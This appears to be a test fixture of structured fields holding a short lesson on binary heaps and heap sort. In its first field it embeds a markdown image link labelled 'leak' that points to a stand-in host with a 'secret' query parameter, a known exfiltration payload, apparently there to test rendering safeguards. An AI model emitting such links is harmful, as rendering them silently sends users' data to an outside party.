steps.text: A heap keeps the **smallest** item on top. ![leak](https://exfil.example.net/e2e.png?d=secret)
Removing the top takes **log n** steps.

parts.title: Heap basics
parts.summary: The array layout and the heap property.

parts.title: Heap sort
parts.summary: Sorting with a heap in place.

input.title: x
input.body:
A priority queue hands back the smallest item first. A binary heap stores it as a complete tree in an array, so the parent of index i sits at (i - 1) // 2 and its children at 2i + 1 and 2i + 2. Every parent is no larger than its children, which keeps the minimum at index 0.

## Why it is fast

Pushing appends and sifts up; popping swaps the last item to the root and sifts down. Each takes O(log n) steps because the tree is balanced.
